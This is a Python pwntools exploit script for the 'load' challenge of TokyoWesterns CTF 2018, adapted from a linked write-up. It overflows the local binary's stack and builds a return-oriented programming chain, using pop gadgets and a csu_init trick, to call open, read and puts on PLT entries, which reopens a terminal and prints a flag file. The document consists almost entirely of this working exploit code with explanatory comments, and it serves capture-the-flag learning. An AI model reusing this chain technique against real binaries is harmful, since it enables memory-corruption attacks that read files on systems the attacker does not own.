# This exploit is from: https://lordidiot.github.io/2018-09-03/tokyowesterns-ctf-2018-load-pwn/

# Import pwntools
from pwn import *

# Declare some variables needed later. The flag file on the server was /home/load/flag.txt, I just changed it to run on my local system
stdinSL = "/proc/self/fd/0"
stdout = "/dev/pts/2"
flag = "/home/guy/flag.txt"

# Declare needed plt functions
openPlt = p64(0x400710)
readPlt = p64(0x4006e8)
putsPlt = p64(0x4006c0)

# Delcare the target process
target = process('./load')
#gdb.attach(target)

# Establish the functions to pop values 
def popRdi(arg):
	return p64(0x400a73) + p64(arg)
	# 0x400a73 : pop rdi ; ret

def popRsi(arg):
	return p64(0x400a71) + p64(arg) + p64(0xdead)
	# 0x400a71 : pop rsi ; pop r15 ; ret

# This function is different from the rest, since there isn't a pop rdx gadget, we had to get creative and use csu_init
def popRdx(arg):
	segment = p64(0x400a6b)
	# 0x400a6b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
	segment += p64(1)
	segment += p64(0x600fc0) # address of GOT_close
	segment += p64(arg)
	segment += p64(0xdead)*2
	segment += p64(0x400a46)
	# 0x400a46 Not found with rop gadget, but will lead to moc rdx, r13 at 0x400a50
	segment += "0"*8*7 # For the rbx, rbp, r12, r13, r14, and r15 registers
	return segment

# Make the ROP Chain

# offset from the start of our input, to the return address
chain = "0"*56

# Rop Chain segment for open("/dev/pts/2", 0x2702, 0x0)
chain += popRdx(0)
chain += popRsi(0x2702)
chain += popRdi(0x601040 + len(stdinSL + "\x00"))
chain += openPlt

# Rop Chain segment for open("/dev/pts/2", 0x2702, 0x0)
chain += popRdx(0)
chain += popRsi(0x2702)
chain += popRdi(0x601040 + len(stdinSL + "\x00"))
chain += openPlt

# Rop Chain segment for open("/home/guy/flag.txt", 0x0, 0x0)
chain += popRdx(0)
chain += popRsi(0x0)
chain += popRdi(0x601040 + len(stdinSL + "\x00" + stdout + "\x00"))
chain += openPlt

# Rop Chain segment for read(2, 0x601000, 10000)
chain += popRdx(10000)
chain += popRsi(0x601000)
chain += popRdi(2)
chain += readPlt

# Rop Chain for puts(0x601000)
chain += popRdi(0x601000)
chain += putsPlt

# Send the string we want for the input filename
target.sendline(stdinSL + "\x00" + stdout + "\x00" + flag + "\x00")

# Send our offset, 0
target.sendline("0")

# Send our input size, the size of our ROP Chain
target.sendline(str(len(chain)))

# Send our ROP Chain
target.sendline(chain)

# Drop to an interactive shell and see the flag, if we did everything right
print target.interactive()